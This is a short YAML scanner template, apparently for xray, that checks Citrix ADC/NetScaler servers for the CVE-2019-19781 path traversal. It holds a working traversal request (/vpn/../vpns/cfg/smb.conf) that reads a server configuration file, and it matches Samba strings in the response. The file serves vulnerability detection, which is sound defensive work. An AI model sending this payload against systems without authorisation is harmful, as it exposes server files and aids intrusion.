name: poc-yaml-citrix-cve-2019-19781-path-traversal
binding: 4a4bc434-b631-4381-885e-2689b4964afb
manual: true
detail:
    author: su(https://suzzz112113.github.io/#blog)
    links:
        - https://www.tripwire.com/state-of-security/vert/citrix-netscaler-cve-2019-19781-what-you-need-to-know/
    vulnerability:
        id: CT-23107
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /vpn/../vpns/cfg/smb.conf
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"encrypt passwords") && response.body.bcontains(b"name resolve order")
expression: r0()
